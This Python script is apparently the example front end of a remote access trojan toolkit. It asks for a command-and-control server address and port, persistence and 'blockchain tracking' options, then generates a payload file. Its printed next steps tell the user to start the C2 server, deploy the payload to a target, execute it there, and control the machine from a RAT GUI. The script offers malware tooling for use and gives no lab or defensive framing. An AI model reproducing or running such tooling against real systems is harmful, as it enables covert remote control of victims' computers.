#!/usr/bin/env python3
"""
Example: Generate Custom Payload
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from payload_generator import PayloadGenerator

def generate_payload():
    """Generate a custom payload with specific configuration"""
    
    print("=" * 60)
    print("RAT Payload Generator")
    print("=" * 60)
    print()
    
    # Get configuration from user
    server_ip = input("Enter C2 server IP address [127.0.0.1]: ").strip() or "127.0.0.1"
    server_port = input("Enter C2 server port [4444]: ").strip() or "4444"
    server_port = int(server_port)
    
    output_file = input("Enter output filename [payload.py]: ").strip() or "payload.py"
    
    persistence = input("Enable persistence? (y/n) [y]: ").strip().lower() or "y"
    persistence = persistence == "y"
    
    blockchain = input("Enable blockchain tracking? (y/n) [y]: ").strip().lower() or "y"
    blockchain = blockchain == "y"
    
    if blockchain:
        blockchain_host = input(f"Enter blockchain server IP [{server_ip}]: ").strip() or server_ip
        blockchain_port = input("Enter blockchain server port [5444]: ").strip() or "5444"
        blockchain_port = int(blockchain_port)
    else:
        blockchain_host = None
        blockchain_port = None
    
    print("\n" + "=" * 60)
    print("Generating payload...")
    print("=" * 60)
    
    # Generate payload
    gen = PayloadGenerator()
    result = gen.generate_payload(
        server_ip=server_ip,
        server_port=server_port,
        output_file=output_file,
        persistence=persistence,
        blockchain_enabled=blockchain,
        blockchain_host=blockchain_host,
        blockchain_port=blockchain_port
    )
    
    print(f"\n[✓] Payload generated successfully!")
    print(f"\nConfiguration:")
    print(f"  Session ID: {result['session_id']}")
    print(f"  Output File: {result['output_file']}")
    print(f"  C2 Server: {result['server']}")
    print(f"  Persistence: {persistence}")
    print(f"  Blockchain: {result['blockchain_enabled']}")
    
    if blockchain:
        print(f"  Blockchain Server: {blockchain_host}:{blockchain_port}")
    
    print(f"\nNext steps:")
    print(f"  1. Start the C2 server: python3 rat_control.py")
    print(f"  2. Deploy payload to target: {output_file}")
    print(f"  3. Execute on target: python3 {output_file}")
    print(f"  4. Control from RAT GUI")
    
    print("\n" + "=" * 60)

if __name__ == "__main__":
    try:
        generate_payload()
    except KeyboardInterrupt:
        print("\n\n[!] Cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

